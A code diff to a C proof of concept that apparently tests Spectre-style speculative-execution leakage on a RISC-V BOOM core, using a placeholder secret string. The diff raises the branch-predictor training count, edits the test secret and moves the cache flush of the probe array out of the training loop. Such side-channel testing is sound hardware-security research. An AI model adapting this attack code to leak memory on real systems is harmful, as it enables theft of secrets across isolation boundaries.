@@ -3,7 +3,7 @@
 #include "encoding.h"
 #include "cache.h"
 
-#define TRAIN_TIMES 30 // emprically chosen
+#define TRAIN_TIMES 64 // emprically chosen
 #define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
 #define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
 #define SECRET_SZ 31
@@ -18,7 +18,7 @@ uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t unused2[64];
 uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
 //uint8_t array2[256 * 4096];
-char* secretString = "k!\"#ThisIsTheBabySonicBoomerTest";
+char* secretString = "!\"#ThisIsTheBabySonicBoomerTest";
 
 #define read_csr(reg) ({ unsigned long __tmp; \
   asm volatile ("csrr %0, " #reg : "=r"(__tmp)); \
@@ -117,13 +117,13 @@ int main(void){
             // make sure array you read from is not in the cache
             //flushCache((uint64_t)array2, sizeof(array2));
 	    randIdx = atkRound % array1_sz;
+            flushCache((uint64_t)array2, sizeof(array2));
 
             for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-2; j >= 0; --j){
                 // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                 // avoid jumps in case those tip off the branch predictor
                 // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                 //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
-                flushCache((uint64_t)array2, sizeof(array2));
                 /* Delay (act as mfence) */                
                 for(volatile int k = 0; k < 100; ++k){
                     asm("");
